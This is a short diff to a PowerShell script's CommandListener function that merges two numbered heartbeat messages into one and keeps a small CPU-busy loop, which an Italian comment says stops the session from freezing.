@@ -250,10 +250,9 @@ function CommandListener
             $timeout = $timeout+100
             Start-Sleep -Milliseconds $timeout
             if ($timeout -eq 10000) {
-                SendMessage "[Heart Beat] 1"
                 # Impegna la CPU per evitare che la sessione di powershell si blocchi
                 for ($i = 0; $i -lt 5; $i++) {(Get-Random) + (Get-Random) / 2 * 20}
-                SendMessage "[Heart Beat] 2"
+                SendMessage "[Heart Beat]"
                 $timeout = 1000
             }
 
